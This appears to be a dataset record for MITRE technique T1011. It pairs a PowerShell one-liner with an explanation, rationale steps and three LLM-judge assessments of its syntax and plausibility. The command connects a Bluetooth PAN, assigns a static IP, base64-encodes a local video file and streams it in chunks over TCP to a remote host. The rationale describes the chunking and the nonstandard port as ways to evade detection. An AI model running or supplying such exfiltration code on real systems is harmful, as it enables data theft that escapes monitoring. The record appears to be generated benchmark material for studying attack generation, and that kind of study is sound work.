command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Videos\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()
explanation: Leverages Bluetooth PAN with a static IP and streams base64 in small chunks over a high TCP port to reduce anomalies on the alternate medium (T1011).
rationale_steps: Configure Bluetooth interface with a /30 to isolate routing.
Bind TCP client to Bluetooth IP to ensure exfil over Bluetooth.
Chunk base64 payload and transmit over a nonstandard port to evade simple detection.

llm_judgments.syntactic_justification: The one-liner is valid PowerShell with balanced quotes/braces, proper separators, and plausible .NET and CLI calls.
llm_judgments.semantic_justification: It conceptually exfiltrates over a Bluetooth PAN and binds the TCP client to that interface (aligning with T1011), but relies on a dubious BluetoothCL connect syntax, requires admin for setting a static IP, and assumes a specific IP configuration, reducing operational plausibility.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced parentheses, braces, and quotes, proper semicolon separators, valid .NET method calls, and correct pipeline usage throughout.
llm_judgments.semantic_justification: The command accurately implements T1011 by connecting via Bluetooth PAN using BluetoothCL.exe, assigning a static IP to the Bluetooth network adapter, then reading and base64-encoding a file before streaming it in 2048-byte chunks over TCP to a remote host on the alternate Bluetooth network medium, fully consistent with the technique description.

llm_judgments.syntactic_justification: The command is a perfectly well-formed PowerShell script using correct syntax for variable assignment, object instantiation, method calls, and looping structures.
llm_judgments.semantic_justification: The command accurately implements the technical flow for T1011; however, the 'netsh' command requires administrative privileges which contradicts the 'None' privilege metadata provided.
